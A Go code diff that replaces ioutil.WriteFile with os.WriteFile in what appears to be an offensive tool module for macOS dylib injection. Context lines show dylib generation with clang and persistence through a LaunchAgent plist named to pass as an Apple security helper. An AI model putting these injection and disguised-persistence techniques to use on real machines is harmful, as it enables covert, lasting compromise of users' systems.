@@ -6,7 +6,6 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -83,7 +82,7 @@ void test_injection() {
 }
 `
 	testSourceFile := "/tmp/test_injection.c"
-	if err := ioutil.WriteFile(testSourceFile, []byte(testSource), 0644); err == nil {
+	if err := os.WriteFile(testSourceFile, []byte(testSource), 0644); err == nil {
 		// Compile the test dylib
 		cmd = exec.Command("clang", "-dynamiclib", "-o", testDylib, testSourceFile)
 		if _, err := cmd.Output(); err == nil {
@@ -217,7 +216,7 @@ func (c *DYLDInjectionCommand) generateDylib(args []string) CommandResult {
 
 	// Write source to temp file
 	sourceFile := strings.TrimSuffix(outputPath, ".dylib") + ".c"
-	if err := ioutil.WriteFile(sourceFile, []byte(sourceCode), 0644); err != nil {
+	if err := os.WriteFile(sourceFile, []byte(sourceCode), 0644); err != nil {
 		return CommandResult{
 			Output:   fmt.Sprintf("Failed to write source: %v", err),
 			ExitCode: 1,
@@ -635,7 +634,7 @@ func (c *DYLDInjectionCommand) persistDylib(args []string) CommandResult {
 		home := os.Getenv("HOME")
 		plistPath := filepath.Join(home, "Library/LaunchAgents/com.apple.security.helper.plist")
 
-		if err := ioutil.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
+		if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
 			output += fmt.Sprintf("[-] Failed to create plist: %v\n", err)
 		} else {
 			output += fmt.Sprintf("[+] Created: %s\n", plistPath)
